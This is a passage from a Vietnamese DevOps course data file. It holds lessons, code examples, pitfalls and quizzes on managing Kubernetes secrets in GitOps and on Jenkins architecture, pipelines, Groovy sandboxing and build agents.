        h: "Bài toán: Git là nguồn sự thật, nhưng secret không được vào Git",
        p: [
          "Kubernetes Secret chỉ mã hoá base64, không phải mã hoá thật. Commit Secret YAML vào Git nghĩa là ai đọc được repo, hoặc bất kỳ bản clone, fork nào, đều có mật khẩu. Có hai hướng giải quyết: lưu secret đã được mã hoá trong Git, hoặc chỉ lưu tham chiếu tới secret nằm ở secret manager bên ngoài."
        ],
        list: [
          "Sealed Secrets: mã hoá bằng khoá công khai của controller trong cluster; chỉ controller giải mã được. Đơn giản, không cần hạ tầng ngoài.",
          "SOPS: mã hoá giá trị trong file YAML/JSON bằng age, PGP hoặc KMS của cloud; key vẫn đọc được nên diff dễ xem. Flux giải mã sẵn; Argo CD cần plugin.",
          "External Secrets Operator (ESO): Git chỉ chứa tham chiếu; operator đọc từ AWS Secrets Manager, Vault, GCP Secret Manager... rồi tạo Secret trong cluster, có thể tự làm mới."
        ]
      },
      {
        h: "External Secrets Operator với AWS Secrets Manager",
        p: [
          "ESO thường là lựa chọn tốt nhất khi đã dùng cloud: secret nằm một nơi, xoay vòng tập trung, phân quyền bằng IAM. ClusterSecretStore mô tả cách kết nối; ExternalSecret mô tả lấy key nào, tạo Secret tên gì. Operator xác thực tới AWS bằng service account gắn IAM role, không có access key."
        ],
        code: {
          lang: "yaml",
          file: "apps/task-api/overlays/production/external-secret.yaml",
          src: `apiVersion: external-secrets.io/v1
kind: ClusterSecretStore
metadata:
  name: aws-secrets-manager
spec:
  provider:
    aws:
      service: SecretsManager
      region: ap-southeast-1
      auth:
        jwt:
          serviceAccountRef:
            name: external-secrets
            namespace: external-secrets
---
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: task-api-db
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    kind: ClusterSecretStore
    name: aws-secrets-manager
  target:
    name: task-api-db          # Secret Kubernetes được tạo ra
  data:
    - secretKey: DATABASE_URL
      remoteRef:
        key: prod/task-api/database-url`
        }
      },
      {
        h: "Sealed Secrets và SOPS",
        p: [
          "Với Sealed Secrets, bạn tạo Secret cục bộ ở chế độ dry-run rồi mã hoá bằng `kubeseal`; chỉ file đã mã hoá được commit. Với SOPS, file `.sops.yaml` quy định mã hoá trường nào bằng khoá nào, thường chỉ mã hoá `data` và `stringData`."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Sealed Secrets: tạo SealedSecret từ Secret dry-run
kubectl create secret generic task-api-db -n production \\
  --from-literal=DATABASE_URL='postgres://app:***@db:5432/app' \\
  --dry-run=client -o yaml \\
  | kubeseal --format yaml > sealed-task-api-db.yaml

# SOPS với age: chỉ mã hoá các trường data/stringData
cat > .sops.yaml <<'EOF'
creation_rules:
  - path_regex: secrets/production/.*\\.yaml$
    encrypted_regex: ^(data|stringData)$
    age: age1examplepublickeyreplacewithyourown
EOF
sops --encrypt --in-place secrets/production/task-api-db.yaml`
        }
      },
      {
        h: "So sánh nhanh",
        p: [
          "Sealed Secrets đơn giản nhất nhưng gắn với khoá của một cluster; mất khoá thì phải mã hoá lại mọi thứ, nên phải backup khoá controller. SOPS linh hoạt, dùng được ngoài Kubernetes, nhưng cần quản lý khoá giải mã cho agent GitOps. ESO không đưa secret vào Git chút nào và hỗ trợ xoay vòng tập trung, đổi lại phụ thuộc vào secret manager bên ngoài. Dù chọn cách nào, Secret sau khi được tạo trong cluster vẫn cần RBAC chặt và bật mã hoá etcd."
        ]
      }
    ],
    summary: [
      "Kubernetes Secret chỉ là base64, không được commit dạng plain.",
      "Sealed Secrets và SOPS lưu secret đã mã hoá trong Git.",
      "External Secrets Operator chỉ lưu tham chiếu, đọc secret từ secret manager.",
      "Backup khoá giải mã, dùng RBAC chặt và mã hoá etcd."
    ],
    pitfalls: [
      "Commit Secret YAML với giá trị base64 vì tưởng đó là mã hoá.",
      "Không backup khoá của Sealed Secrets controller, dựng lại cluster thì không giải mã được gì.",
      "Để file Secret tạm (chưa mã hoá) trong thư mục repo rồi vô tình commit."
    ],
    quiz: [
      {
        q: "Vì sao không được commit Kubernetes Secret YAML thông thường vào Git?",
        options: ["Vì YAML của Secret không hợp lệ","Vì Git không lưu được file Secret","Vì base64 chỉ là encoding, ai cũng giải được","Vì Argo CD không đọc được Secret"],
        answer: 2,
        explain: "Base64 là encoding, không phải encryption; ai có repo đều đọc được giá trị."
      },
      {
        q: "External Secrets Operator lưu gì trong Git?",
        options: ["Chỉ tham chiếu tới secret ở bên ngoài","Giá trị secret đã được mã hoá","Giá trị secret dạng plain text","Khoá riêng của controller"],
        answer: 0,
        explain: "ExternalSecret chỉ mô tả lấy key nào từ đâu; giá trị nằm ở secret manager."
      },
      {
        q: "Rủi ro vận hành lớn nhất của Sealed Secrets là gì?",
        options: ["Không hỗ trợ Kubernetes mới","Không mã hoá được giá trị dài","Giải mã quá chậm khi deploy","Mất khoá controller thì không giải mã được"],
        answer: 3,
        explain: "Chỉ khoá của controller giải mã được; cần backup khoá để khôi phục khi dựng lại cluster."
      }
    ]
  },
  "p08.m6.t0": {
    videos: [
      { id: "6k8o_6vAaGQ", title: "Học Jenkins từ A đến Z / Kiên Lê TV", channel: "Kien Le Tech", lang: "vi", minutes: 23, embed: true },
      { id: "4KghHJEz5no", title: "What Is a Jenkins Agent?", channel: "CloudBeesTV", lang: "en", minutes: 3, embed: true }
    ],
    sections: [
      {
        h: "Các thành phần của một hệ thống Jenkins",
        p: [
          "Khi công ty nói \"Jenkins\", thường đó là một hệ thống gồm nhiều máy chứ không phải một tiến trình. Hiểu đúng các khái niệm dưới đây giúp bạn đọc được log, biết build đang chạy ở đâu và vì sao nó phải xếp hàng.",
          "Các tài liệu cũ dùng chữ master/slave; từ năm 2020 Jenkins đổi thành controller/agent, và node của controller gọi là built-in node."
        ],
        list: [
          "Controller: tiến trình Java phục vụ giao diện web, lưu cấu hình, lên lịch build và điều phối agent. Controller không nên tự chạy build.",
          "Agent: máy (VM, container, pod) nhận việc từ controller và chạy các bước `sh`, `docker build`, test.",
          "Node: tên chung cho controller và agent. Executor: một \"khe\" chạy build trên node; node có 2 executor thì chạy tối đa 2 build cùng lúc.",
          "Label: nhãn gắn cho agent như `docker`, `linux`, `deploy`. Pipeline xin `agent { label 'docker' }` và Jenkins chọn node có nhãn đó.",
          "Workspace: thư mục làm việc của một job trên agent, chứa code đã checkout. Hai build song song của cùng job dùng workspace khác nhau (hậu tố `@2`).",
          "`JENKINS_HOME`: thư mục dữ liệu của controller gồm cấu hình (`config.xml`), `jobs/` (lịch sử build), `plugins/`, `users/` và `secrets/` (khoá giải mã credential)."
        ]
      },
      {
        h: "Agent kết nối với controller thế nào",
        p: [
          "Có ba cách phổ biến. SSH: controller SSH vào máy agent và khởi động tiến trình agent (plugin SSH Build Agents), phù hợp với VM Linux cố định. Inbound: tiến trình agent trên máy kia tự kết nối về controller, qua cổng TCP 50000 hoặc qua WebSocket trên cổng HTTP(S) thông thường; cách này hợp khi agent nằm sau firewall hoặc controller đứng sau reverse proxy. Cloud: plugin Docker, Kubernetes hoặc EC2 tạo agent tạm thời cho mỗi build rồi xoá đi.",
          "Agent tạm thời là hướng nên đi: mỗi build có môi trường sạch, không còn rác từ build trước, và không phải bảo trì một dàn máy build \"thú cưng\"."
        ]
      },
      {
        h: "Phiên bản và Java",
        p: [
          "Jenkins có hai dòng phát hành. Weekly ra mỗi tuần. LTS (Long-Term Support) chọn một bản weekly làm nền khoảng 12 tuần một lần, sau đó ra các bản vá .2, .3 cách nhau khoảng 4 tuần. Doanh nghiệp nên dùng LTS; tại thời điểm 9/2026 bản LTS mới nhất là 2.568.3 (phát hành 2/9/2026).",
          "Từ LTS 2.555.1 (4/2026), Jenkins yêu cầu Java 21 hoặc Java 25. Yêu cầu này áp dụng cho controller và mọi loại agent, nên khi nâng cấp Jenkins phải kiểm tra cả Java trên agent. JDK dùng để build ứng dụng Java của bạn thì độc lập, có thể là bản khác."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Chạy thử Jenkins LTS bằng Docker: pin đúng phiên bản thay vì tag trôi
docker volume create jenkins_home
docker run -d --name jenkins --restart=on-failure \\
  -p 8080:8080 -p 50000:50000 \\
  -v jenkins_home:/var/jenkins_home \\
  jenkins/jenkins:2.568.3-jdk21

# Mật khẩu admin lần đầu
docker exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword`
        }
      },
      {
        h: "Không build trên controller",
        p: [
          "Mặc định Jenkins cho phép build chạy trên built-in node để người mới dễ bắt đầu. Tài liệu bảo mật của Jenkins khuyên tắt điều này: build chạy trên built-in node có cùng quyền truy cập file như chính tiến trình Jenkins, tức là đọc được `JENKINS_HOME` và các khoá giải mã credential. Vào Manage Jenkins → Nodes → Built-In Node → Configure, đặt số executor bằng 0, và chuẩn bị sẵn agent trước khi làm."
        ]
      }
    ],
    summary: [
      "Controller điều phối, agent chạy build; executor là số build chạy song song trên một node.",
      "Agent kết nối qua SSH, inbound (TCP 50000 hoặc WebSocket) hoặc được cloud plugin tạo tạm thời.",
      "Dùng dòng LTS; từ 2.555.1 cần Java 21 hoặc 25 cho cả controller lẫn agent.",
      "Đặt 0 executor cho built-in node để build không chạm được vào dữ liệu của controller."
    ],
    pitfalls: [
      "Dùng tag `jenkins/jenkins:latest` (dòng weekly) cho production, mỗi lần pull lại nhảy phiên bản.",
      "Nâng Jenkins lên LTS mới mà quên agent vẫn chạy Java 17, agent không kết nối được.",
      "Để build chạy trên controller, một script lỗi làm đầy ổ đĩa là cả Jenkins ngừng hoạt động."
    ],
    quiz: [
      {
        q: "Một node có 3 executor nghĩa là gì?",
        options: ["Node đó chạy tối đa 3 build cùng lúc", "Node đó có 3 CPU", "Mỗi build được chạy lại 3 lần nếu lỗi", "Node đó kết nối tới 3 controller"],
        answer: 0,
        explain: "Executor là khe chạy build. Số executor không gắn với số CPU, không liên quan tới retry và một agent chỉ thuộc một controller."
      },
      {
        q: "Từ LTS 2.555.1, phiên bản Java nào được hỗ trợ để chạy Jenkins?",
        options: ["Java 11 hoặc 17", "Java 17 hoặc 21", "Java 21 hoặc 25", "Bất kỳ Java nào từ 8 trở lên"],
        answer: 2,
        explain: "Chính sách Java của Jenkins: từ LTS 2.555.1 (4/2026) chỉ hỗ trợ Java 21 và 25, áp dụng cho controller và agent."
      },
      {
        q: "Vì sao nên đặt số executor của built-in node về 0?",
        options: ["Để Jenkins khởi động nhanh hơn", "Để build không có quyền truy cập file của controller", "Vì built-in node không chạy được lệnh sh", "Để tiết kiệm giấy phép Jenkins"],
        answer: 1,
        explain: "Build trên built-in node chạy với quyền của tiến trình Jenkins, đọc được cấu hình và khoá giải mã secret. Jenkins là mã nguồn mở, không có giấy phép theo executor."
      }
    ]
  },
  "p08.m6.t1": {
    videos: [
      { id: "IOUm1lw7F58", title: "What Is The Difference Between Freestyle and Pipeline in Jenkins", channel: "CloudBeesTV", lang: "en", minutes: 9, embed: true },
      { id: "tuxO7ZXplRE", title: "Create Multibranch Pipeline with Git - Jenkins Pipeline Tutorial for Beginners 2/4", channel: "TechWorld with Nana", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "Các loại job bạn sẽ gặp",
        p: [
          "Một Jenkins lâu năm trong công ty thường có đủ mọi loại job, từ job click tay tạo năm 2015 tới multibranch pipeline mới. Biết loại job giúp bạn biết cấu hình nằm ở đâu và sửa ở đâu."
        ],
        list: [
          "Freestyle project: cấu hình bằng form trên giao diện (checkout, Execute shell, post-build action). Cấu hình lưu trong `config.xml` trên controller, không có review, không có lịch sử thay đổi rõ ràng.",
          "Pipeline: pipeline viết bằng Jenkinsfile, dán trực tiếp trong job hoặc lấy từ repo (Pipeline script from SCM).",
          "Multibranch Pipeline: tự quét một repo, tạo job con cho mỗi nhánh và pull/merge request có Jenkinsfile.",
          "Organization Folder: quét cả một organization GitHub hay group GitLab/Bitbucket, tự tạo multibranch cho mọi repo có Jenkinsfile.",
          "Folder: gom job theo team hoặc dự án, gắn phân quyền và credential riêng cho từng folder."
        ]
      },
      {
        h: "Vì sao nên chuyển sang Pipeline as code",
        p: [
          "Jenkinsfile nằm trong repo nên thay đổi pipeline đi qua pull request, có review, có lịch sử git và rollback được. Pipeline còn có tính bền (durability): build đang chạy có thể tiếp tục sau khi controller khởi động lại. Freestyle không có các lợi ích này, và mỗi lần sửa là một lần click tay khó kiểm soát.",
          "Cách chuyển một job Freestyle: mở trang cấu hình, ghi lại từng phần rồi ánh xạ sang Jenkinsfile. Làm song song, giữ job cũ cho đến khi pipeline mới chạy ổn vài tuần."
        ],
        list: [
          "Source Code Management → `checkout scm` (multibranch tự làm việc này).",
          "Build Triggers → webhook, hoặc `triggers { cron(...) }` cho job định kỳ.",
          "This project is parameterized → `parameters { ... }`.",
          "Execute shell → `sh '...'` trong `steps`.",
          "Post-build Actions (publish JUnit, archive, email) → khối `post`."
        ]
      },
      {
        h: "Đối chiếu với GitHub Actions và GitLab CI",
        p: [
          "Nếu bạn đã học GitHub Actions ở các bài trước, phần lớn khái niệm có tương đương trực tiếp. Bảng này giúp bạn đọc Jenkinsfile nhanh hơn."
        ],
        list: [
          "`pipeline` ↔ workflow (GitHub) ↔ pipeline (GitLab).",
          "`stage` ↔ job ↔ job trong một stage.",
          "`agent { label 'x' }` ↔ `runs-on` ↔ `tags` của runner; `agent { docker {...} }` ↔ `container:` ↔ `image:`.",
          "Jenkins Credentials ↔ Secrets ↔ CI/CD Variables (masked, protected).",
          "`when { branch 'main' }` ↔ `if: github.ref == 'refs/heads/main'` ↔ `rules: - if: $CI_COMMIT_BRANCH == \"main\"`.",
          "`input` ↔ environment có required reviewers ↔ `when: manual`.",
          "`post { always {...} }` ↔ `if: always()` ↔ `after_script`.",
          "Shared library ↔ reusable workflow/composite action ↔ `include:`/CI/CD components."
        ]
      }
    ],
    summary: [
      "Freestyle cấu hình bằng click và nằm trên controller; Pipeline nằm trong repo và được review.",
      "Multibranch tự tạo job theo nhánh và PR; Organization Folder làm việc đó cho cả tổ chức.",
      "Chuyển Freestyle bằng cách ánh xạ từng phần cấu hình sang Jenkinsfile, chạy song song trước khi tắt job cũ.",
      "Khái niệm Jenkins có tương đương trong GitHub Actions và GitLab CI."
    ],
    pitfalls: [
      "Dán Jenkinsfile trực tiếp vào ô script của job, mất luôn lợi ích review và lịch sử.",
      "Xoá job Freestyle ngay khi pipeline mới chạy được một lần, không còn đường lui.",
      "Sửa pipeline bằng giao diện trên production Jenkins mà không ghi lại, người sau không biết vì sao nó chạy như vậy."
    ],
    quiz: [
      {
        q: "Loại job nào tự tạo job con cho mỗi nhánh và pull request có Jenkinsfile?",
        options: ["Freestyle project", "Multibranch Pipeline", "Pipeline dán script trực tiếp", "Folder"],
        answer: 1,
        explain: "Multibranch Pipeline quét repo và tạo job cho từng nhánh/PR. Folder chỉ để gom nhóm, Freestyle và Pipeline đơn chỉ là một job."
      },
      {
        q: "Lợi ích chính của Jenkinsfile trong repo so với job Freestyle là gì?",
        options: ["Chạy nhanh hơn gấp đôi", "Không cần agent", "Thay đổi pipeline được review và có lịch sử git", "Không cần cài plugin nào"],
        answer: 2,
        explain: "Pipeline as code đưa pipeline vào quy trình review và version control. Tốc độ, agent và plugin không phải điểm khác biệt chính."
      },
      {
        q: "Trong Jenkins, cái gì tương đương với `when: manual` của GitLab CI?",
        options: ["Bước `input` chờ người duyệt", "Khối `post`", "`triggers { cron(...) }`", "`options { retry(3) }`"],
        answer: 0,
        explain: "`input` dừng pipeline chờ người bấm duyệt, giống job manual. `post` chạy sau stage, cron là lịch, retry là chạy lại khi lỗi."
      }
    ]
  },
  "p08.m6.t2": {
    videos: [
      { id: "_Qhe1rETqGg", title: "Jenkins Tutorial: Tích hợp Jenkins với Github bằng Jenkinsfile", channel: "TechMaster Vietnam", lang: "vi", minutes: 10, embed: true },
      { id: "7KCS70sCoK0", title: "Complete Jenkins Pipeline Tutorial | Jenkinsfile explained", channel: "TechWorld with Nana", lang: "en", minutes: 35, embed: true }
    ],
    sections: [
      {
        h: "Bộ khung Declarative đầy đủ",
        p: [
          "Declarative Pipeline có cấu trúc cố định nên Jenkins kiểm tra được cú pháp trước khi chạy. Các directive chính: `agent` (chạy ở đâu), `environment` (biến môi trường), `options` (timeout, giữ bao nhiêu build, chặn chạy song song), `parameters` (tham số khi chạy tay), `triggers` (cron, pollSCM, upstream), `tools`, `stages`, và `post`.",
          "Tham số đọc qua `params.TEN`. Jenkins cung cấp sẵn nhiều biến môi trường: `BUILD_NUMBER`, `BUILD_URL`, `JOB_NAME`, `WORKSPACE`; sau khi checkout có `GIT_COMMIT`; trong multibranch có `BRANCH_NAME`, và build của PR có thêm `CHANGE_ID`, `CHANGE_TARGET`."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `pipeline {
  agent { label 'linux' }
  options {
    timeout(time: 30, unit: 'MINUTES')
    buildDiscarder(logRotator(numToKeepStr: '30'))
    disableConcurrentBuilds()
    timestamps()
  }
  parameters {
    choice(name: 'LOG_LEVEL', choices: ['info', 'debug'], description: 'Mức log khi chạy test')
    booleanParam(name: 'RUN_E2E', defaultValue: false, description: 'Chạy thêm test e2e')
  }
  triggers { cron('H 2 * * 1-5') }   // chạy đêm các ngày làm việc, H rải giờ theo tên job
  stages {
    stage('Install') { steps { sh 'npm ci' } }
    stage('Kiểm tra') {
      failFast true
      parallel {
        stage('Lint') { steps { sh 'npm run lint' } }
        stage('Unit test') {
          steps { sh 'LOG_LEVEL=' + params.LOG_LEVEL + ' npm test' }
          post { always { junit 'reports/junit.xml' } }
        }
      }
    }
    stage('E2E') {
      when { expression { params.RUN_E2E } }
      steps { sh 'npm run test:e2e' }
    }
  }
  post {
    failure { echo "Build #\${env.BUILD_NUMBER} lỗi: \${env.BUILD_URL}" }
    fixed   { echo 'Build đã xanh trở lại' }
    cleanup { cleanWs() }
  }
}`
        }
      },
      {
        h: "when, beforeAgent và input",
        p: [
          "`when` quyết định stage có chạy không: `branch 'main'`, `buildingTag()`, `changeRequest()` (build của PR/MR), `changeset '**/*.sql'`, `environment name: 'X', value: 'y'`, `expression { ... }`, kết hợp bằng `allOf`, `anyOf`, `not`. Điều kiện `branch` chỉ hoạt động trong multibranch pipeline.",
          "Mặc định Jenkins cấp agent cho stage rồi mới xét `when`. Thêm `beforeAgent true` trong `when` để xét điều kiện trước, tránh chiếm một agent chỉ để rồi bỏ qua stage. Tương tự có `beforeInput true` và `beforeOptions true`.",
          "Directive `input` đặt ở cấp stage làm pipeline dừng trước khi vào `agent` của stage, nên khi chờ người duyệt sẽ không giữ executor nào. Đây là lý do nên dùng directive này thay vì gọi bước `input` bên trong `steps` của một stage đang giữ agent."
        ]
      },
      {
        h: "Trạng thái build và khối post",
        p: [
          "Build có các trạng thái SUCCESS, UNSTABLE, FAILURE, ABORTED. `junit` đánh dấu build UNSTABLE (màu vàng) khi có test lỗi, thay vì FAILURE. Khối `post` có các điều kiện `always`, `success`, `failure`, `unstable`, `aborted`, `unsuccessful` (mọi trạng thái trừ success), `changed` (khác lần trước), `fixed` (lần trước lỗi, lần này xanh), `regression` (lần trước xanh, lần này hỏng) và `cleanup` (chạy sau cùng, dùng để dọn dẹp).",
          "Muốn chuyển file giữa các stage chạy trên agent khác nhau, dùng `stash`/`unstash`. Muốn giữ file sau khi build xong (bản build, báo cáo), dùng `archiveArtifacts`. Artifact lớn nên đẩy lên Nexus/Artifactory thay vì lưu trên controller."
        ]
      }
    ],
    summary: [
      "Khung Declarative: agent, environment, options, parameters, triggers, stages, post.",
      "`when` + `beforeAgent true` để không chiếm agent cho stage bị bỏ qua.",
      "`input` ở cấp stage chờ duyệt mà không giữ executor.",
      "Dùng `fixed`/`regression` để thông báo đúng lúc, `cleanup` để dọn workspace."
    ],
    pitfalls: [
      "Dùng `when { branch 'main' }` trong job Pipeline thường (không phải multibranch), điều kiện không bao giờ đúng.",
      "Không đặt `timeout`, một test treo giữ agent cả đêm.",
      "Thông báo Slack/Telegram ở `always`, kênh chat ngập tin nhắn và mọi người tắt thông báo."
    ],
    quiz: [
      {
        q: "`beforeAgent true` trong khối `when` có tác dụng gì?",
        options: ["Chạy stage trên controller", "Xét điều kiện `when` trước khi cấp agent cho stage", "Bỏ qua bước checkout", "Cấp agent trước khi pipeline bắt đầu"],
        answer: 1,
        explain: "Mặc định agent được cấp rồi mới xét `when`. `beforeAgent true` đảo thứ tự để stage bị bỏ qua không chiếm agent."
      },
      {
        q: "Điều kiện `post` nào chạy khi build lần trước lỗi và lần này thành công?",
        options: ["always", "changed chỉ khi lần này lỗi", "fixed", "regression"],
        answer: 2,
        explain: "`fixed` dành cho lỗi → xanh; `regression` là xanh → hỏng; `changed` chạy mỗi khi trạng thái khác lần trước, theo cả hai chiều."
      },
      {
        q: "Khi test có lỗi và kết quả được publish bằng `junit`, build thường ở trạng thái nào?",
        options: ["SUCCESS", "ABORTED", "NOT_BUILT", "UNSTABLE"],
        answer: 3,
        explain: "`junit` đặt build thành UNSTABLE khi có test lỗi. Nếu chính lệnh test trả exit code khác 0 thì stage sẽ FAILURE trước đó."
      }
    ]
  },
  "p08.m6.t3": {
    videos: [
      { id: "GJBlskiaRrI", title: "What Is the Difference Between Scripted and Declarative Pipeline", channel: "CloudBeesTV", lang: "en", minutes: 5, embed: true }
    ],
    sections: [
      {
        h: "Groovy trong Jenkins: đủ dùng là được",
        p: [
          "Jenkinsfile viết bằng một DSL dựa trên Groovy. Bạn cần biết vài cú pháp: chuỗi nháy đơn `'...'` là chuỗi thường, chuỗi nháy kép `\"...\"` là GString có nội suy `\${...}`, chuỗi ba nháy `'''...'''` cho lệnh nhiều dòng; map `[name: 'api', port: 3000]`; list `['a', 'b']`; closure `{ ... }`.",
          "Trong Declarative, logic Groovy tuỳ ý phải nằm trong khối `script { }`. Nếu thấy khối `script` dài hàng chục dòng, đó là dấu hiệu nên chuyển logic vào shell script trong repo hoặc vào shared library.",
          "Kết quả của lệnh shell lấy qua `sh(script: '...', returnStdout: true).trim()` hoặc mã thoát qua `returnStatus: true`."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `stage('Chọn môi trường') {
  steps {
    script {
      // Việc lọc file giao cho shell; Groovy chỉ nhận kết quả. Gán vào env để stage sau đọc được.
      env.ONLY_DOCS = sh(
        script: 'git diff --name-only HEAD~1 | grep -qv "^docs/" && echo false || echo true',
        returnStdout: true
      ).trim()
    }
    echo "Chỉ đổi tài liệu: \${env.ONLY_DOCS}"
  }
}`
        }
      },
      {
        h: "Groovy chạy trên controller, không phải trên agent",
        p: [
          "Đây là điều nhiều người không biết: mọi đoạn Groovy trong pipeline (vòng lặp, xử lý chuỗi, parse JSON) chạy trên controller và dùng CPU, RAM của controller. Chỉ các bước như `sh`, `bat` mới chạy trên agent. Hướng dẫn Pipeline Best Practices của Jenkins nói rõ: dùng Groovy làm \"keo dán\" nối các bước, còn việc nặng giao cho `sh`. Một pipeline đọc file log 200MB bằng `readFile` rồi xử lý bằng Groovy có thể làm chậm cả Jenkins.",
          "Để pipeline tiếp tục được sau khi controller khởi động lại, Jenkins biến đổi code theo kiểu CPS và lưu trạng thái định kỳ. Hệ quả là biến giữ đối tượng không serialize được (ví dụ `java.util.regex.Matcher`) có thể gây `NotSerializableException`, và vài cú pháp Groovy như `collection.each { }` không được hỗ trợ đầy đủ. Hàm đánh dấu `@NonCPS` chạy như Groovy thường, nhanh hơn, nhưng bên trong không được gọi bước pipeline như `sh` hay `echo`."
        ]
      },
      {
        h: "Sandbox và Script Approval",
        p: [
          "Jenkinsfile trong repo chạy trong Groovy sandbox: chỉ gọi được các phương thức đã có trong danh sách an toàn. Khi gặp lỗi `Scripts not permitted to use method ...`, admin có thể phê duyệt chữ ký đó ở Manage Jenkins → In-process Script Approval.",
          "Đừng bấm duyệt cho nhanh. Duyệt những chữ ký như `jenkins.model.Jenkins getInstance` hay `java.io.File` là trao cho mọi người có quyền sửa Jenkinsfile toàn quyền trên controller. Tương tự, Script Console (Manage Jenkins → Script Console) chạy Groovy ngoài sandbox với toàn quyền, chỉ dành cho admin."
        ]
      },
      {
        h: "Scripted Pipeline",
        p: [
          "Các Jenkins cũ hay có pipeline dạng Scripted, bắt đầu bằng `node { ... }` thay vì `pipeline { ... }`, với `stage('x') { ... }` bên trong và điều khiển luồng bằng `if`, `try/catch/finally` của Groovy. Bạn cần đọc được nó để bảo trì; pipeline mới thì viết Declarative, vì dễ đọc hơn và được kiểm tra cú pháp trước khi chạy."
        ]
      }
    ],
    summary: [
      "Nháy đơn là chuỗi thường, nháy kép nội suy `\${}`; logic tuỳ ý đặt trong `script { }`.",
      "Groovy chạy trên controller; việc nặng giao cho `sh` trên agent.",
      "CPS giúp pipeline sống sót khi controller restart nhưng hạn chế một số cú pháp; `@NonCPS` không gọi được bước pipeline.",
      "Cẩn trọng với Script Approval: duyệt sai chữ ký là mở toàn quyền controller."
    ],
    pitfalls: [
      "Parse file JSON lớn bằng Groovy trong pipeline thay vì dùng `jq` trong `sh`.",
      "Gọi `sh` bên trong một hàm `@NonCPS`.",
      "Duyệt mọi chữ ký trong Script Approval để \"cho build chạy được\"."
    ],
    quiz: [
      {
        q: "Đoạn Groovy trong khối `script { }` (không phải bước `sh`) chạy ở đâu?",
        options: ["Trên agent được cấp cho stage", "Trên máy của developer", "Trên controller", "Trong container riêng do Docker tạo"],
        answer: 2,
        explain: "Code Groovy của pipeline chạy trên controller; chỉ các bước như `sh`, `bat` được gửi xuống agent."
      },
      {
        q: "Hàm đánh dấu `@NonCPS` có hạn chế gì?",
        options: ["Không được gọi các bước pipeline như `sh`, `echo`", "Không được trả về giá trị", "Chỉ chạy trên Windows", "Không dùng được biến cục bộ"],
        answer: 0,
        explain: "`@NonCPS` chạy như Groovy thường, không qua CPS, nên không được gọi bước pipeline bên trong. Nó vẫn trả về giá trị và dùng biến cục bộ bình thường."
      },
      {
        q: "Khi gặp lỗi `Scripts not permitted to use method jenkins.model.Jenkins getInstance`, cách xử lý đúng là gì?",
        options: ["Duyệt ngay trong Script Approval", "Tắt sandbox cho mọi job", "Viết lại, tránh gọi API nội bộ của Jenkins từ pipeline", "Chạy build trên built-in node"],
        answer: 2,
        explain: "Duyệt chữ ký này trao toàn quyền controller cho người sửa Jenkinsfile. Best practice của Jenkins coi việc gọi `Jenkins.instance` từ pipeline là dùng sai."
      }
    ]
  },
  "p08.m6.t4": {
    videos: [
      { id: "ymI02j-hqpU", title: "How to Setup Docker Containers As Build Agents for Jenkins", channel: "CloudBeesTV", lang: "en", minutes: 10, embed: true },
      { id: "ZXaorni-icg", title: "How to Use Kubernetes Pods As Jenkins Agents", channel: "CloudBeesTV", lang: "en", minutes: 25, embed: true }
    ],
    sections: [
      {
        h: "Ba kiểu agent trong thực tế",
        p: [
          "Agent cố định là VM được cài sẵn công cụ (Docker, Node, JDK, kubectl) và gắn label. Dễ hiểu, nhưng công cụ dần lệch phiên bản giữa các máy và rác từ build trước để lại. Agent Docker dùng một máy có Docker, mỗi stage chạy trong container từ image bạn chọn. Agent Kubernetes tạo một pod cho mỗi build rồi xoá đi, co giãn theo tải.",
          "Với agent Docker, cần cài plugin Docker Pipeline và agent phải có Docker. Jenkins mount workspace vào container và chạy các bước `sh` bên trong."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `pipeline {
  agent none
  stages {
    stage('Test API') {
      agent {
        docker {
          image 'node:24-alpine'
          label 'docker'          // chọn máy có Docker
        }
      }
      steps { sh 'npm ci && npm test' }
    }
    stage('Test Java') {
      agent { docker { image 'maven:3.9-eclipse-temurin-21'; label 'docker' } }
      steps { sh 'mvn -B verify' }
    }
  }
}`
        }
      },
      {
        h: "Agent Kubernetes",
        p: [
          "Plugin Kubernetes tạo pod theo khai báo YAML. Pod luôn có container agent tên `jnlp` (tên lịch sử) giữ kết nối với controller, cộng với các container công cụ bạn thêm vào. Bước `container('ten') { ... }` chạy lệnh trong container đó; `defaultContainer` đặt container mặc định cho mọi bước.",
          "Container công cụ cần một lệnh giữ nó sống, thường là `command: [cat]` với `tty: true`, vì image như `node` sẽ thoát ngay nếu không có lệnh chạy lâu. Nên đặt `resources.requests` để scheduler xếp pod đúng và build không tranh tài nguyên của nhau."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `pipeline {
  agent {
    kubernetes {
      defaultContainer 'node'
      yaml '''
        apiVersion: v1
        kind: Pod
        spec:
          containers:
          - name: node
            image: node:24-alpine
            command: [cat]
            tty: true
            resources:
              requests: { cpu: "500m", memory: "1Gi" }
      '''
    }
  }
  stages {
    stage('Test') { steps { sh 'npm ci && npm test' } }
    stage('Kiểm tra môi trường') {
      steps { container('jnlp') { sh 'java -version' } }   // container agent vẫn dùng được
    }
  }
}`
        }
      },
      {
        h: "Build image trong agent tạm thời",
        p: [
          "Trong pod Kubernetes không có Docker daemon. Có ba cách build image: mount Docker socket của node (nhanh nhưng build chiếm quyền root của node, không nên), Docker-in-Docker với container privileged, hoặc công cụ không cần daemon như Kaniko hay Buildah. Lưu ý repo Kaniko gốc (GoogleContainerTools) đã được archive ngày 3/6/2025 và không còn được phát triển; nếu Jenkins công ty đang dùng image Kaniko cũ, hãy lên kế hoạch chuyển sang Buildah, BuildKit rootless hoặc một bản fork còn được bảo trì. Agent Docker cũng cần cache phụ thuộc (npm, Maven) qua volume để build sau không tải lại từ đầu; nhớ cấp quyền ghi cho user mà Jenkins dùng trong container.",
          "Agent cố định vẫn hợp lý cho vài trường hợp: build cần phần cứng đặc biệt, cần truy cập mạng nội bộ riêng (agent deploy đặt trong vùng mạng production), hoặc build Windows/macOS."
        ]
      }
    ],
    summary: [
